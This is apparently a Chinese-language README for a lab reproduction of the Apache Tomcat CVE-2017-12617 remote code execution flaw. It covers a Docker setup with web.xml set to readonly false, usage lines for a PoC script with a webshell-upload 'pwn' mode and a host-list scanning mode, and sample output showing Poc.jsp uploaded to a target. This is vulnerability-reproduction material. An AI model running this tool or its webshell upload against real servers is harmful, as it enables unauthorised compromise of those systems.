# CVE-2017-12617
Apache Tomcat团队10月3日宣布，如果配置了默认servlet，则在9.0.1（Beta），8.5.23,8.0.47和7.0.82之前的所有Tomcat版本都包含所有操作系统上的潜在危险的远程执行代码（RCE）漏洞，CVE-2017-12617：远程代码执行漏洞。

# 环境
使用image: tomcat:7.0.79-jre8复现漏洞
```
docker-compose up -d

```
修改 .\conf\web.xml 配置文件，增加 readonly 设置为 false ，一定要记得重启下tomcat服务。
为了不用每次都要导入数据，我们将采用挂载的方式持久化,将需要修改的web.xml定义放在./目录，挂载到容器指定目录
volumes:
    - ./web.xml:/usr/local/tomcat/conf/web.xml


# poc
<br>./cve-2017-12617.py [options]

<br>options:

<br>-u ,--url [::] check target url if it's vulnerable 
<br>-p,--pwn  [::] generate webshell and upload it
<br>-l,--list [::] hosts list

<br>[+]usage:

<br>./cve-2017-12617.py -u http://127.0.0.1
<br>./cve-2017-12617.py --url http://127.0.0.1
<br>./cve-2017-12617.py -u http://127.0.0.1 -p pwn
<br>./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn
<br>./cve-2017-12617.py -l hotsts.txt
<br>./cve-2017-12617.py --list hosts.txt

```
 python tomcat-cve-2017-12617.py -u http://10.160.11.191:8080



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Poc Filename  Poc.jsp
File Created ..
http://10.160.11.191:8080 it's Vulnerable to CVE-2017-12617
http://10.160.11.191:8080/Poc.jsp

```

# 参考

*http://www.freebuf.com/vuls/150203.html